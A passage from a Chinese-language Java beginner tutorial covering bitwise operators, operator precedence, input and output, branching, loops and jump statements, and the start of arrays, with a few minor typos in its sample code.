运算规则：往右移动后，左边空出来的位直接补0，不看符号位</p><p>按位与：&amp;</p><p>​    运算规则：</p><p>​        1 &amp; 1 结果为1</p><p>​        1 &amp; 0 结果为0</p><p>​        0 &amp; 1 结果为0</p><p>​        0 &amp; 0 结果为0</p><p>按位或：|</p><p>​    运算规则：</p><p>​        1 | 1 结果为1</p><p>​        1 | 0 结果为1</p><p>​        0 | 1 结果为1</p><p>​        0 &amp; 0 结果为0</p><p>按位异或：^</p><p>​    运算规则：</p><p>​        1 ^ 1 结果为0</p><p>​        1 ^ 0 结果为1</p><p>​        0 ^ 1 结果为1</p><p>​        0 ^ 0 结果为0</p><p>按位取反：~</p><p>​     运算规则：~0就是1  </p><p>​               ~1就是0</p><blockquote><p>如何区分&amp;,|,^是逻辑运算符还是位运算符？</p><p>如果操作数是boolean类型，就是逻辑运算符，如果操作数是整数，那么就位运算符。</p></blockquote><h3 id="2-4-7-运算符优先级"><a href="#2-4-7-运算符优先级" class="headerlink" title="2.4.7 运算符优先级"></a>2.4.7 运算符优先级</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1553858424335.png" alt="1553858424335" title>                </div>                <div class="image-caption">1553858424335</div>            </figure><p>提示说明：</p><p>（1）表达式不要太复杂</p><p>（2）先算的使用()</p><h3 id="2-4-8-运算符操作数类型说明"><a href="#2-4-8-运算符操作数类型说明" class="headerlink" title="2.4.8 运算符操作数类型说明"></a>2.4.8 运算符操作数类型说明</h3><p>1、算术运算符</p><p>数字和单个字符可以使用算术运算符。</p><p>其中+，当用于字符串时，表示拼接。</p><p>2、赋值运算符</p><p>右边的常量值、表达式的值、变量的值的类型必须与左边的变量一致或兼容（可以实现自动类型转换）或使用强制类型转换可以成功。</p><p>3、比较运算符</p><p>其他的比较运算符都是只能用于8种基本数据类型。</p><p>其中的==和!=可以用于引用数据类型的比较，用于比较对象的地址。（后面讲）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">10</span>;</span><br><span class="line">System.out.println(i==j);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c1 = <span class="string">'帅'</span>;</span><br><span class="line"><span class="keyword">char</span> c2 = <span class="string">'帅'</span>;</span><br><span class="line">System.out.println(c1 == c2);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>4、逻辑运算符</p><p>逻辑运算符的操作数必须是boolean值</p><p>5、条件运算符</p><p>?前面必须是条件，必须是boolean值</p><p>结果表达式1和结果表达式2要保持类型一致或兼容</p><p>6、位运算符</p><p>一般用于整数系列</p><blockquote><p>以上运算符都是针对基本数据类型设计的。</p><p>能够用于引用数据类型只有基本的赋值运算符=，和比较运算符中的==和!=。其他运算符都不能用于引用数据类型。</p><p>其中字符串类型还有一个+，表示拼接。</p></blockquote><h1 id="第三章-流程控制语句结构"><a href="#第三章-流程控制语句结构" class="headerlink" title="第三章 流程控制语句结构"></a>第三章 流程控制语句结构</h1><p>流程控制语句结构分为：</p><p>1、顺序结构：从上到下依次执行</p><p>2、分支结构：多个分支选择其中一个分支执行</p><p>3、循环结构：重复执行某些代码</p><h2 id="3-1-顺序结构"><a href="#3-1-顺序结构" class="headerlink" title="3.1 顺序结构"></a>3.1 顺序结构</h2><p>执行过程：从上到下顺序执行</p><h3 id="3-1-1-输出语句"><a href="#3-1-1-输出语句" class="headerlink" title="3.1.1 输出语句"></a>3.1.1 输出语句</h3><p>1、System.out.print(输出内容); #输出内容后不换行</p><p>2、System.out.println(输出内容);  #输出内容后换行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#输出常量</span><br><span class="line">System.out.print(<span class="number">1</span>);</span><br><span class="line">System.out.print(<span class="string">'尚'</span>);</span><br><span class="line">System.out.print(<span class="number">44.4</span>);</span><br><span class="line">System.out.print(<span class="keyword">true</span>);</span><br><span class="line">System.out.print(<span class="string">"尚硅谷"</span>);</span><br><span class="line"></span><br><span class="line">#输出变量</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">'尚'</span>;</span><br><span class="line"><span class="keyword">double</span> d = <span class="number">44.4</span>;</span><br><span class="line"><span class="keyword">boolean</span> b = <span class="keyword">true</span>;</span><br><span class="line">String school = <span class="string">"尚硅谷"</span>;</span><br><span class="line">System.out.print(a);</span><br><span class="line">System.out.print(c);</span><br><span class="line">System.out.print(d);</span><br><span class="line">System.out.print(b);</span><br><span class="line">System.out.print(school);</span><br><span class="line"></span><br><span class="line">#输出拼接结果</span><br><span class="line">System.out.print(<span class="string">"a = "</span> + a);</span><br><span class="line">System.out.print(<span class="string">"c = "</span> + c);</span><br><span class="line">System.out.print(<span class="string">"d = "</span> + d);</span><br><span class="line">System.out.print(<span class="string">"b = "</span> + b);</span><br><span class="line">System.out.print(<span class="string">"school = "</span> + school);</span><br></pre></td></tr></table></figure><h3 id="3-1-2-输入语句"><a href="#3-1-2-输入语句" class="headerlink" title="3.1.2 输入语句"></a>3.1.2 输入语句</h3><p>键盘输入代码的三个步骤：</p><p>1、准备Scanner类型的变量</p><p>2、提示输入xx</p><p>3、接收输入内容</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、准备Scanner类型的变量</span></span><br><span class="line">java.util.Scanner input = <span class="keyword">new</span> java.util.Scanner(System.in);<span class="comment">//System.in默认代表键盘输入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、提示输入xx</span></span><br><span class="line">System.out.print(<span class="string">"请输入一个整数："</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、接收输入内容</span></span><br><span class="line"><span class="keyword">int</span> num = input.nextInt();</span><br><span class="line"></span><br><span class="line"><span class="comment">//列出各种数据类型的输入</span></span><br><span class="line"><span class="keyword">int</span> num = input.nextInt();</span><br><span class="line"><span class="keyword">long</span> bigNum = input.nextLong();</span><br><span class="line"><span class="keyword">double</span> d = input.nextDouble();</span><br><span class="line"><span class="keyword">boolean</span> b = input.nextBoolean();</span><br><span class="line">String s = input.next();</span><br><span class="line"><span class="keyword">char</span> c = input.next().charAt(<span class="number">0</span>);<span class="comment">//先按照字符串接收，然后再取字符串的第一个字符（下标为0）</span></span><br></pre></td></tr></table></figure><h2 id="3-2-分支结构"><a href="#3-2-分支结构" class="headerlink" title="3.2 分支结构"></a>3.2 分支结构</h2><p>分支结构：根据条件选择性的执行某些代码</p><p>分为：</p><p>1、条件判断：if…else系列</p><p>2、选择结构：switch…case系列</p><h3 id="3-2-1-条件判断"><a href="#3-2-1-条件判断" class="headerlink" title="3.2.1 条件判断"></a>3.2.1 条件判断</h3><h4 id="1、单分支结构"><a href="#1、单分支结构" class="headerlink" title="1、单分支结构"></a>1、单分支结构</h4><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">    当条件表达式成立(<span class="keyword">true</span>)时需要执行的语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>​    条件成立，就执行{}其中的语句块，不成立就不执行。</p><blockquote><p>注意：</p><p>（1）if(条件表达式)中的条件表达式的结果必须是boolean类型</p><p>（2）当{}中的语句只有一个语句（简单的语句，也可以是一个复合语句）时，可以省略{}，但是我们不建议省略</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//省略&#123;&#125;的情况</span></span><br><span class="line"><span class="keyword">if</span>(score&lt;<span class="number">0</span> || score&gt;<span class="number">100</span>)</span><br><span class="line">System.out.println(<span class="string">"输入有误！"</span>);<span class="comment">//简单的语句</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">//复合语句</span></span><br><span class="line"><span class="keyword">if</span>(score==<span class="number">100</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">"满分"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score&gt;=<span class="number">80</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">"优秀"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score&gt;=<span class="number">60</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">"及格"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">System.out.println(<span class="string">"不及格"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> year = <span class="number">2019</span>;</span><br><span class="line"><span class="keyword">int</span> days = <span class="number">28</span>;</span><br><span class="line"><span class="keyword">if</span>(year%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; year%<span class="number">100</span>!=<span class="number">0</span> || year%<span class="number">400</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    days= <span class="number">29</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、双分支结构"><a href="#2、双分支结构" class="headerlink" title="2、双分支结构"></a>2、双分支结构</h4><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">    当条件表达式成立(<span class="keyword">true</span>)时需要执行的语句块<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    当条件表达式不成立(<span class="keyword">false</span>)时需要执行的语句块<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>​    当条件表达式成立(true)时执行语句块1，否则执行语句块2</p><blockquote><p>注意：</p><p>（1）if(条件表达式)中的条件表达式的结果必须是boolean类型</p><p>（2）当{}中的语句只有一个语句（简单的语句，也可以是一个复合语句）时，可以省略{}，但是我们不建议</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    System.out.println(num + <span class="string">"是偶数"</span>)；</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     System.out.println(num + <span class="string">"是奇数"</span>)；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、多分支结构"><a href="#3、多分支结构" class="headerlink" title="3、多分支结构"></a>3、多分支结构</h4><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式<span class="number">1</span>)&#123;</span><br><span class="line">    当条件表达式<span class="number">1</span>成立的时候，执行的语句块<span class="number">1</span>；</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式<span class="number">2</span>)&#123;</span><br><span class="line">    当条件表达式<span class="number">1</span>不成立，</span><br><span class="line">      条件表达式<span class="number">2</span>成立的时候，执行的语句块<span class="number">2</span>；</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式<span class="number">3</span>)&#123;</span><br><span class="line">    当条件表达式<span class="number">1</span>不成立，</span><br><span class="line">       条件表达式<span class="number">2</span>也不成立，</span><br><span class="line">      条件表达式<span class="number">3</span>成立的时候，执行的语句块<span class="number">3</span>；</span><br><span class="line">&#125;</span><br><span class="line">。。。</span><br><span class="line">【<span class="keyword">else</span>&#123;</span><br><span class="line">当以上所有的条件表达式都不成立，需要执行的语句块n+<span class="number">1</span>;</span><br><span class="line">&#125;】</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>（1）多个条件顺序往下判断，如果上面有一个条件成立了，下面的条件就不看了</p><p>（2）多个分支也只会执行其中的一个</p><blockquote><p>注意：</p><p>（1）每一个条件表达式都必须是boolean值</p><p>（2）当{}中只有一个语句时，也可以省略{}，但不建议省略</p><p>（3）当多个条件是“互斥”关系（没有重叠部分），顺序可以随意；</p><p>​          当多个条件是“包含”关系（有重叠部分），顺序不能随意，小的在上，大的在下面</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> score = <span class="number">78</span>;</span><br><span class="line"><span class="keyword">if</span>(score==<span class="number">100</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">"满分"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score&gt;=<span class="number">80</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">"优秀"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score&gt;=<span class="number">60</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">"及格"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">System.out.println(<span class="string">"不及格"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、嵌套"><a href="#4、嵌套" class="headerlink" title="4、嵌套"></a>4、嵌套</h4><p>执行过程：</p><p>​    当嵌套在if中，就是当外面的if成立时，才会看里面的条件判断；</p><p>​    当嵌套在else中，就当外面的else满足时，才会看里面的条件判断；</p><h3 id="3-2-2-选择结构"><a href="#3-2-2-选择结构" class="headerlink" title="3.2.2 选择结构"></a>3.2.2 选择结构</h3><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">1</span>:</span><br><span class="line">        语句块<span class="number">1</span>;</span><br><span class="line">        【<span class="keyword">break</span>;】</span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">2</span>:</span><br><span class="line">        语句块<span class="number">2</span>;</span><br><span class="line">        【<span class="keyword">break</span>;】   </span><br><span class="line">    。。。</span><br><span class="line">   【<span class="keyword">default</span>:</span><br><span class="line">        语句块n+<span class="number">1</span>;</span><br><span class="line">        【<span class="keyword">break</span>;】</span><br><span class="line">     】</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>（1）入口</p><p>①当switch(表达式)的值与case后面的某个常量值匹配，就从这个case进入；</p><p>②当switch(表达式)的值与case后面的所有常量值都不匹配，寻找default分支进入;</p><p>（2）一旦从“入口”进入switch，就会顺序往下执行，直到遇到“出口”</p><p>（3）出口</p><p>①自然出口：遇到了switch的结束}</p><p>②中断出口：遇到了break等</p><blockquote><p>注意：</p><p>（1）switch(表达式)的值的类型，只能是：4种基本数据类型（byte,short,int,char），两种引用数据类型（枚举、String）</p><p>（2）case后面必须是常量值，而且不能重复</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> month = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">switch</span>(month)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        System.out.println(<span class="string">"春季"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        System.out.println(<span class="string">"夏季"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        System.out.println(<span class="string">"秋季"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        System.out.println(<span class="string">"冬季"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        System.out.println(<span class="string">"输入有误！"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-循环结构"><a href="#3-3-循环结构" class="headerlink" title="3.3 循环结构"></a>3.3 循环结构</h2><p>循环结构：</p><p>​    “重复”执行某些代码</p><p>循环结构的分类：</p><p>1、for循环</p><p>2、while循环</p><p>3、do…while循环</p><h3 id="3-3-1-for循环"><a href="#3-3-1-for循环" class="headerlink" title="3.3.1 for循环"></a>3.3.1 for循环</h3><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    循环体语句块；</span><br><span class="line">    <span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(初始化表达式; 循环条件; 迭代表达式)&#123;</span><br><span class="line">    循环体语句块；（需要重复执行的代码）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>（1）初始化表达式;</p><p>（2）判断循环条件;</p><p>（3）如果循环条件成立，先执行循环体语句块；然后执行迭代表达式，再回到（2）…</p><p>（4）如果循环条件不成立，会结束for；</p><p>​         或者在当前循环中遇到break语句，也会结束当前for循环;</p><blockquote><p>注意：</p><p>（1）for(;;)中的两个；是不能多也不能少</p><p>（2）循环条件必须是boolean类型</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历1-100之间的偶数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">100</span>; i++)&#123;<span class="comment">//每次循环的步幅是1</span></span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历1-100之间的偶数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;=<span class="number">100</span>; i+=<span class="number">2</span>)&#123;<span class="comment">//每次循环的步幅是2</span></span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-2-while循环"><a href="#3-3-2-while循环" class="headerlink" title="3.3.2 while循环"></a>3.3.2 while循环</h3><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(循环条件)&#123;</span><br><span class="line">    循环体语句块;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">经典的形式：</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">循环体语句块;</span><br><span class="line">    <span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>（1）先判断循环条件</p><p>（2）如果循环条件成立，就执行循环体语句块；然后回到（1）</p><p>（3）如果循环条件不成立，就结束while循环；</p><p>​     如果在循环体语句块中，遇到break，也会结束while循环；</p><blockquote><p>注意：</p><p>（1）while(循环条件)中循环条件必须是boolean类型</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历1-100之间的偶数</span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">while</span>(num&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">    System.out.println(num);</span><br><span class="line">    num+=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-3-do…while循环"><a href="#3-3-3-do…while循环" class="headerlink" title="3.3.3 do…while循环"></a>3.3.3 do…while循环</h3><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    循环体语句块;</span><br><span class="line">&#125;<span class="keyword">while</span>(循环条件);</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>（1）先执行一次循环体语句块；</p><p>（2）判断循环条件</p><p>（3）如果循环条件成立，再次执行循环体语句块；然后回到（2）…</p><p>（4）如果循环条件不成立，就结束do…while循环；</p><p>​         如果在循环体语句块中，遇到break，也会结束do…while循环；</p><blockquote><p>注意：</p><p>（1）while(循环条件)中循环条件必须是boolean类型</p><p>（2）do{}while();最后有一个分号</p><p>（3）do…while结构的循环体语句是至少会执行一次，这个和for和while是不一样的</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从键盘输入整数，统计正数、负数的个数，输入0结束</span></span><br><span class="line">java.util.Scanner input = <span class="keyword">new</span> java.util.Scanner(System.in);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">int</span> positive = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> negative = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    System.out.print(<span class="string">"请输入整数（0结束）："</span>);</span><br><span class="line">    num = input.nextInt();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        positive++;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        negatvie++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(num!=<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"正数的个数："</span> + positive);</span><br><span class="line">System.out.println(<span class="string">"负数的个数："</span> + negatvie);</span><br></pre></td></tr></table></figure><h3 id="3-3-4-三种循环的选择"><a href="#3-3-4-三种循环的选择" class="headerlink" title="3.3.4 三种循环的选择"></a>3.3.4 三种循环的选择</h3><p>原则：三种循环之间是可以互相转换的，都能实现循环的功能</p><p>建议（习惯上）：当我们次数比较明显的时候，或者说从几循环到几的时候，一般先考虑for；</p><p>​                当循环体语句块至少要执行一次的时候，一般先考虑do…while；</p><p>​                    当循环条件比较明显，但是次数不明显，循环体语句块也不是至少执行一次，那么可以考虑while结构；</p><p>三种循环结构都具有四要素：</p><p>（1）循环变量的初始化表达式</p><p>（2）循环条件</p><p>（3）循环变量的修改的迭代表达式</p><p>（4）循环体语句块</p><h3 id="3-3-5-跳转语句"><a href="#3-3-5-跳转语句" class="headerlink" title="3.3.5 跳转语句"></a>3.3.5 跳转语句</h3><p>1、break</p><p>用于：</p><p>（1）switch结构</p><p>作用：结束switch结构</p><p>（2）循环结构</p><p>作用：结束<strong>当前</strong>循环</p><p>2、continue </p><p>用于：</p><p>只能用于循环结构</p><p>作用：提前结束本次循环，继续下一次循环</p><p>3、return（后面讲）</p><h1 id="第四章-数组"><a href="#第四章-数组" class="headerlink" title="第四章 数组"></a>第四章 数组</h1><h2 id="4-1-数组的相关概念和名词（了解）"><a href="#4-1-数组的相关概念和名词（了解）" class="headerlink" title="4.1 数组的相关概念和名词（了解）"></a>4.1 数组的相关概念和名词（了解）</h2><p>1、数组(array)：</p><p>​    一组具有相同数据类型的数据的按照一定顺序排列的集合。</p><p>​       把有限的几个相同类型的变量使用一个名称来进行统一管理。</p><p>2、数组名：</p><p>​    （1）这个数组名，代表的是一组数</p><p>​    （2）这个数组名中存储的整个数组的“首地址”</p><p>3、下标(index)：</p><p>​    我们使用编号、索引、下标来区别表示一组数当中某一个。</p><p>​    范围：[0,数组长度-1]     </p><p>​    例如：for(int i = 0;  i&lt;arr.length; i++){}</p><p>4、元素(element)：</p><p>​    这一组中的的每一个数据都是元素。</p><p>​    如何表示数组元素？  数组名[下标]</p><p>5、数组的长度(length)</p><p>​    数组中元素的总个数。</p><p>​    如何获取数组长度？  数组名.length</p><blockquote><p>注意：名称是为了沟通的方便，概念不用一字不落背下来</p></blockquote><h2 id="4-2-数组的相关语法"><a href="#4-2-数组的相关语法" class="headerlink" title="4.2 数组的相关语法"></a>4.2 数组的相关语法</h2><h3 id="4-2-1-数组的声明"><a href="#4-2-1-数组的声明" class="headerlink" title="4.2.1 数组的声明"></a>4.2.1 数组的声明</h3><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//推荐</span></span><br><span 